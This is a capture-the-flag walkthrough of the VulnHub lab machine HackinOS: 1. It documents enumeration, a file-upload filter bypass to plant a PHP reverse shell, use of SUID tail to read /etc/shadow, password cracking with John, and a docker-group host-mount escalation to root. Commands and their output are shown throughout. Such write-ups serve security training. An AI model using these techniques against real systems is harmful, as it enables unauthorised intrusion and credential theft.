# HackinOS: 1

## Recon & Enummeration

Nmap shows us the following:
```
Nmap scan report for 10.10.10.10
Host is up (0.00057s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d9:c1:5c:20:9a:77:54:f8:a3:41:18:92:1b:1e:e5:35 (RSA)
|   256 df:d4:f2:61:89:61:ac:e0:ee:3b:5d:07:0d:3f:0c:87 (ECDSA)
|_  256 8b:e4:45:ab:af:c8:0e:7e:2a:e4:47:e7:52:f9:bc:71 (ED25519)
8000/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-generator: WordPress 5.0.3
|_http-open-proxy: Proxy might be redirecting requests
| http-robots.txt: 2 disallowed entries 
|_/upload.php /uploads
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Blog &#8211; Just another WordPress site
```

### Port 8000
It's a plain wordpress website. While the Nmap scan is running, we try robots.txt:
```
User-agent:*
Disallow:/upload.php
Disallow:/uploads

```

Also we come across a username: `Handsome_Container`

## Intitial Foothold

The page http://10.10.10.10:8000/upload.php gives us an LFI.
Also, the source code is available via a link in the source code:
https://github.com/fatihhcelik/Vulnerable-Machine---Hint/blob/master/upload.php

We craft a reverse shell php file called `advancedshell.php` and start a listener on port 1234 to catch the reverse shell.

It doesn't work because the file type isn't an actual PNG or GIF file, according to its signature. Thus we modify the file signature as follows:
```
echo "47 49 46 38 37 61" | xxd -r -p - shell.php
```
which contains the file signature of a GIF file.

We bruteforce the upload storage algrithm as follows:
```
for i in $(seq 1 100); do echo -n "shell.php"$i | md5sum | cut -d' ' -f 1| sed -rn 's|(.+)|http://10.10.10.10:8000/uploads/\1.php|p' | parallel 'echo {}; curl -s {}' ;done
```

Then we obtain a shell:

```
www-data@1afdd1f6b82c:/$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Privilege Escalation

When we launch a simple Kernel CVE we miss the required binary to exploit:
```
Linux 4.10 < 5.1.17 PTRACE_TRACEME local root (CVE-2019-13272)
[.] Checking environment ...
[-] Could not find pkexec executable at /usr/bin/pkexec
```


### Root@Container
However, after further enumeration on the machine we discover we are within a docker container since the `/.dockerenv` paths and overlays mounted.

Also, we can find a SUID binary GNU tail. Which let's us read the `/etc/shadow` file, containing the root password:

```
www-data@1afdd1f6b82c:/etc/mysql$ tail -n 900  /etc/shadow
root:$6$qoj6/JJi$FQe/BZlfZV9VX8m0i25Suih5vi1S//OVNpd.PvEVYcL1bWSrF3XTVTF91n60yUuUMUcP65EgT8HfjLyjGHova/:17951:0:99999:7:::
...
```



Which can be cracked with John, and turns out to be, "john", no kiddding:
```
kali@kali:~/ctf/boxes/vulnhub/hackinos$ john hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
john             (root)
1g 0:00:00:01 DONE (2021-05-30 09:30) 0.5988g/s 4138p/s 4138c/s 4138C/s oblivion..better
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

We can access the flag at /root/flag.

Now we have the local docker container root, we aim for the host.

### Hummingbird@Host

We also note a mysql installation on the machine. It isn't available on this container, as it connects to hostname `db` on port 3306 according to `wp-config.php` in the webroot.

When we ping hostname `db` we find out it has IP 172.18.0.3. So we connect to it with the supplied user and password `wordpress:wordpress`


`mysql -h 172.18.0.3 -u wordpress`


And there we go:

```
+-----------------------+
| Tables_in_wordpress   |
+-----------------------+
| host_ssh_cred         |
| wp_commentmeta        |
| wp_comments           |
| wp_links              |
| wp_options            |
| wp_postmeta           |
| wp_posts              |
| wp_term_relationships |
| wp_term_taxonomy      |
| wp_termmeta           |
| wp_terms              |
| wp_usermeta           |
| wp_users              |
+-----------------------+
13 rows in set (0.01 sec)

MySQL [wordpress]> select * from host_ssh_cred;
+-------------------+----------------------------------+
| id                | pw                               |
+-------------------+----------------------------------+
| hummingbirdscyber | e10adc3949ba59abbe56e057f20f883e |
+-------------------+----------------------------------+
```

This MD5 hash is easily crackable using John:
```
kali@kali:~/ctf/boxes/vulnhub/hackinos$ john hosthash --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=3
Press 'q' or Ctrl-C to abort, almost any other key for status
123456           (?)
1g 0:00:00:00 DONE (2021-05-30 09:44) 25.00g/s 9600p/s 9600c/s 9600C/s 123456..michael1
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed
```

Time to log in to SSH!

```
hummingbirdscyber@vulnvm:~$ id
uid=1000(hummingbirdscyber) gid=1000(hummingbirdscyber) groups=1000(hummingbirdscyber),4(adm),24(cdrom),30(dip),46(plugdev),113(lpadmin),128(sambashare),129(docker)
```

### Root@Host

For futher escalation we resort to Linpeas once again.

Linpeas shows us 3 running docker containers. 2 we already explored (partially).
```
Running Docker Containers
252fa8cb1646        ubuntu              "/bin/bash"              2 years ago         Up 19 hours                                brave_edison
1afdd1f6b82c        wordpress:latest    "docker-entrypoint.s…"   2 years ago         Up 19 hours         0.0.0.0:8000->80/tcp   experimental_wordpress_1
81a93420fd22        mysql:5.7           "docker-entrypoint.s…"   2 years ago         Up 19 hours         3306/tcp, 33060/tcp    experimental_db_1
```

We also find proFTPD running as root:
```
root      2879  0.0  0.2  13860  2500 ?        S    11:24   0:00  |   |   |   _ proftpd: (accepting connections)
```

which seems to be running in the 3rd docker container:

```
root      1281  0.0  1.2 233972 12056 ?        Sl   11:24   0:00 docker exec brave_edison /etc/init.d/ftp.sh
```


The fact that the we are able to run docker as root means we can run another ubuntu container and mount the host file system to it and read the flag:

```
hummingbirdscyber@vulnvm:~/Desktop$ docker run -it -v /:/host/ ubuntu:latest chroot /host/ bash
root@c85d809c841d:/# cd /root
root@c85d809c841d:~# ls
flag
root@c85d809c841d:~# head -n 1 flag 
Congratulations!                    
```

As we mounted the host FS we can also read the `/etc/shadow` file:
```
hummingbirdscyber@vulnvm:~/Desktop$ docker run -it -v /:/host/ ubuntu:latest chroot /host/ bash
root@50000283df34:/# head -n 1 /etc/shadow
root:$6$1hmALcmw$RzOKJ7KmhRotfuySmfYZBqUPRl4MalQndhhBg2RCJWsSgqb7/fv4P7zTR0VI/zoAbStq/w51lwnnTgWvgMCNJ1:17955:0:99999:7:::
```



Which hash we can easily crack using John:
```
kali@kali:~/ctf/boxes/vulnhub/hackinos$ john hashes --wordlist=/usr/share/wordlists/rockyou.txt
Warning: only loading hashes of type "sha512crypt", but also saw type "LM"
Use the "--format=LM" option to force loading hashes of that type instead
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Remaining 1 password hash
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
whiterabbit      (root)
```

Which allows us to login with `root:whiterabbit`
```
hummingbirdscyber@vulnvm:~/Desktop$ su 
Password: 
root@vulnvm:/home/hummingbirdscyber/Desktop# id
uid=0(root) gid=0(root) groups=0(root)
```